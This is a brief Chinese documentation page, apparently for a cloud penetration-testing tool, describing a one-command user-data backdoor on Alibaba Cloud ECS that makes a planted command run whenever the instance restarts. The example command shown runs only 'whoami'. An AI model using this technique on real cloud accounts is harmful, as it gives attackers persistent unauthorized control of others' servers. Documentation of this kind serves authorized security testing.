---
title: 用户数据后门
---

## 在阿里云上一键创建用户数据后门

由于在实例启动时，会执行用户数据中的内容，因此通过往用户数据中写入文件，可以起到后门的作用。

现在使用以下命令，就可以修改阿里云实例中的用户数据，这样当实例重启时就会执行该命令了。

```bash
cf alibaba ecs exec --userDataBackdoor "whoami"
```

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2023 年 7 月 1 日"
    }
  }
</script>